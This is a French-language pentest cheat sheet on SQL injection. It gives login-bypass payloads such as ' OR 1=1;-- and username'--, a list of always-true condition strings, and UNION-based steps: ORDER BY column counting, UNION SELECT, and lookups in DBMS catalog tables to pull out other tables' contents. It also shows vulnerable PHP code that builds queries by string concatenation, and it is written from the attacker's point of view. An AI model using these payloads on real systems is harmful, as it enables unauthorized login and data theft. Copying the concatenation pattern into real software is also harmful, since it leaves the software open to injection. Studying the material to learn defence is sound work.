# Injection SQL

## Connexion sans identifiant et sans mot de passe

On tape dans l'identifiant : 

```sql
' OR 1=1 ;--
```

Et on n'oublie pas de mettre un mot de passe aléatoire, au cas ou le système vérifie si un mot de passe est rentré.

{% hint style="warning" %}
Si une erreur est affiché comme 'SQL error', alors il y a une faille dans la gestion du formulaire. Dans cas on va pouvoir l'exploiter pour en tirer d'autres infos. Si aucune sécurité n'est mise en place, la connexion se fera sur le premier utilisateur de la base de données.
{% endhint %}

## Connexion avec seulement l'identifiant

#### 1. Par le nom d'utilisateur

Dans un premier temps, on peut s'attaquer au _**nom d'utilisateur**_. Prenons par exemple, une requête de connexion au serveur de ce type :

```sql
select * from user_table
where username = 'anto'
and password = 'mystrongpassword';
```

En supposant que le mot de passe ne soit pas haché, la requête PHP ressemblerait à ceci :

```php
// Connexion à la database
$db_query = "select * from user_table where
username = '".$user."'
AND password = '".$password."';";
// Execution de la requête
```

Ainsi, en entrant dans la section du nom d'utilisateur « **anto’;--** » la requête SQL devient :

```sql
select * from user_table where
username = 'anto';-- and password = ''
```

Or, le double tiret permet de commenter du code en SQL, ce qui revient donc à contourner le mot de passe, et à pouvoir se connecter en ayant uniquement besoin du nom d'utilisateur.



#### 2. Par le mot de passe, par attaque booléenne 

Une deuxième possibilité à tester, est l'injection SQL booléenne. Par exemple, en ayant une requête SQL de ce type :

```sql
select * from user_table where
username = 'anto' and
password = 'password';
```

On peut très bien contourner le mot de passe, en entrant dans la section du mot de passe la commande « **'or 1=1;--** » qui transforme la requête comme ceci :

```sql
select * from user_table where
username = 'anto' and
password = '' or 1=1;--;
```

Et qui de ce fait, rend totalement inutile la condition password='anto' vu que la condition 1=1 sera toujours vraie.

Il existe une infinité de conditions triviales, par exemple :

```sql
'='
'OR 1=1
'OR a=a
'OR'
'OR''='
'OR"="
'OR'="
'OR '="
'OR "='
'OR ''='
'OR '=''
'OR "=''
'OR ''="
```



{% hint style="warning" %}
Malheureusement pour nous, ces genres de vulnérabilités sont extrêmement rares, mais valent le coup d'être essayés.
{% endhint %}

## Méthode UNION

Une fois une vulnérabilité trouvée, on peut l'exploiter.

Prenons le cas d'un script vulnérable de recherche d'article à partir d'un mot dans le titre, ce script affiche la liste des articles trouvés et des liens vers ceux-ci. Notre objectif est d'utiliser cette requête pour afficher le contenu d'autres tables.

```php
$sql="SELECT * FROM article WHERE title LIKE '%" . $title . "%'";
```

Problème, la structure de la table article nous est inconnue, nous ne connaissons pas ses différents champs; or pour réussir à afficher des informations d'autres tables, plusieurs challenges se posent à nous :

* Trouver le nombre et le type de chaque colonne retournée par la requête
* Trouver le nom d'une colonne et d'une table comportant des choses intéressantes \(Login, Password, etc.\)
* Utiliser une union pour récupérer les informations

Trier par numéro de colonne permet de tester si cette colonne existe. Si la requête retourne 5 colonnes ou plus, la requête suivante va fonctionner :

```sql
SELECT * FROM article WHERE title LIKE '%sql-injection%' ORDER BY 5--'
```

{% hint style="info" %}
Remarque,  '--' est utilisé par tous les SGBD pour les commentaires SQL.
{% endhint %}

Une fois identifié le nombre de colonnes, réalisons une première UNION :

```sql
SELECT * FROM article WHERE title LIKE '%sql-injection%' UNION SELECT 1,2,3,4,5--'
```

{% hint style="info" %}
Pour une base PostgreSQL, la colonne tablename de la table **pg\_tables** va permettre de récupérer le nom des tables, pour MSSQL, select name from **SysObjects**, pour MySQL, select table\_name from **information\_schema.tables .**
{% endhint %}



